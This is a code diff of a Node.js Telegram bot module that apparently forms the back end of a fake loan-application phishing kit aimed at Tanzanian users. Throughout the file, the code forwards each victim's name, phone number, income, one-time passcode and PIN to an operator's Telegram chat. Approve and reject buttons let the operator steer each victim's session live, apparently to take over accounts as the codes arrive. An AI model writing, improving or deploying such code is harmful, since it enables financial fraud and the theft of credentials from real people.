@@ -1,78 +1,61 @@
-const { Telegraf, Markup } = require('telegraf');
-const axios = require('axios');
+const TelegramBot = require("node-telegram-bot-api");
+const axios = require("axios");
 
-const bot = process.env.BOT_TOKEN ? new Telegraf(process.env.BOT_TOKEN) : null;
-const ADMIN_ID = process.env.ADMIN_CHAT_ID;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const SERVER_URL = process.env.RENDER_EXTERNAL_URL;
 
-const sendAdminAlert = async (info) => {
-    if (!bot || !ADMIN_ID) return;
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-    try {
-        let msg = `🚀 *User Activity Update*\n`;
-        msg += `━━━━━━━━━━━━━━━━━━\n`;
-        msg += `📍 *Step:* ${info.step.replace(/_/g, ' ')}\n`;
-        msg += `🆔 *Socket:* \`${info.socketId}\`\n`;
+// Formatters
+const escapeHTML = (str) => String(str || "N/A").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+const currency = (n) => `TZS ${Number(n || 0).toLocaleString()}`;
 
-        // Profile Section (Only shows if Step 2+ is reached)
-        if (info.firstName || info.phone || info.email) {
-            msg += `\n👤 *User Details:*\n`;
-            if (info.firstName) msg += `• Name: ${info.firstName} ${info.lastName || ''}\n`;
-            if (info.phone)     msg += `• Phone: \`+255${info.phone}\`\n`;
-            if (info.email)     msg += `• Email: ${info.email}\n`;
-        }
-        
-        // Financial Section (Only shows if Step 1+ or Step 3+ is reached)
-        if (info.amount || info.income) {
-            msg += `\n💰 *Financials:*\n`;
-            if (info.amount)    msg += `• Loan: TZS ${Number(info.amount).toLocaleString()}\n`;
-            if (info.income)    msg += `• Income: TZS ${Number(info.income).toLocaleString()}\n`;
-            if (info.loanType)  msg += `• Type: ${info.loanType}\n`;
-            if (info.employment) msg += `• Status: ${info.employment}\n`;
-        }
-
-        // Security Section (Only for Step 5)
-        if (info.pin) {
-            msg += `\n━━━━━━━━━━━━━━━━━━\n`;
-            msg += `🔑 *SUBMITTED PIN:* \`${info.pin}\`\n`;
-            msg += `━━━━━━━━━━━━━━━━━━\n`;
-        }
-
-        const keyboard = info.step === '5_PIN_SUBMITTED' ? Markup.inlineKeyboard([
-            [
-                Markup.button.callback('✅ Approve', `approve_${info.socketId}`),
-                Markup.button.callback('❌ Reject', `reject_${info.socketId}`)
-            ]
-        ]) : null;
-
-        await bot.telegram.sendMessage(ADMIN_ID, msg, { 
-            parse_mode: 'Markdown', 
-            ...(keyboard || {}) 
-        });
-
-    } catch (e) {
-        console.error("Bot Alert Error:", e.message);
-    }
+const send = (msg, options = {}) => {
+    return bot.sendMessage(ADMIN_CHAT_ID, msg, { parse_mode: "HTML", ...options });
 };
 
-if (bot) {
-    bot.action(/approve_(.+)/, async (ctx) => {
-        const socketId = ctx.match[1];
-        try {
-            await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'approve' });
-            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n✅ *STATUS: APPROVED*");
-        } catch (err) { console.error("Approve failed"); }
+// --- INDIVIDUAL STEP SENDERS ---
+
+const sendStep1 = (d) => send(`💰 <b>STEP 1 – LOAN DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n📋 <b>Type:</b> ${escapeHTML(d.loanType)}\n💵 <b>Amount:</b> ${currency(d.amount)}`);
+
+const sendStep2 = (d) => send(`👤 <b>STEP 2 – PERSONAL INFO</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}\n📞 <b>Phone:</b> +255${d.phone}`);
+
+const sendStep3 = (d) => send(`💼 <b>STEP 3 – EMPLOYMENT</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n💵 <b>Income:</b> ${currency(d.income)}\n💼 <b>Status:</b> ${escapeHTML(d.employment)}`);
+
+const sendStep4 = (d) => send(`🔢 <b>STEP 4 – OTP GENERATED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n🔢 <b>OTP Code:</b> <code>${escapeHTML(d.otp)}</code>`);
+
+const sendStep5 = (d) => {
+    send(`🔐 <b>STEP 5 – PIN SUBMITTED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName || 'User')}\n🔑 <b>PIN:</b> <code>${escapeHTML(d.pin)}</code>`, {
+        reply_markup: {
+            inline_keyboard: [[
+                { text: "✅ APPROVE", callback_data: `apr_${d.socketId}` },
+                { text: "❌ REJECT", callback_data: `rej_${d.socketId}` }
+            ]]
+        }
     });
+};
 
-    bot.action(/reject_(.+)/, async (ctx) => {
-        const socketId = ctx.match[1];
-        try {
-            await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'reject' });
-            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n❌ *STATUS: REJECTED*");
-        } catch (err) { console.error("Reject failed"); }
-    });
+// Callback for Buttons
+bot.on("callback_query", async (query) => {
+    const [action, socketId] = query.data.split("_");
+    const message = query.message;
 
-    bot.launch().catch(err => console.error("Bot launch fail:", err.message));
-}
+    try {
+        await axios.post(`${SERVER_URL}/admin/action`, { 
+            socketId, 
+            action: action === "apr" ? "approve" : "reject" 
+        });
 
-module.exports = { sendAdminAlert };
+        const statusText = action === "apr" ? "✅ APPROVED" : "❌ REJECTED";
+        bot.editMessageText(`${message.text}\n\n${statusText} BY ADMIN`, {
+            chat_id: ADMIN_CHAT_ID,
+            message_id: message.message_id,
+            parse_mode: "HTML"
+        });
+    } catch (err) {
+        console.error("Callback Error:", err.message);
+    }
+});
+
+module.exports = { sendStep1, sendStep2, sendStep3, sendStep4, sendStep5 };
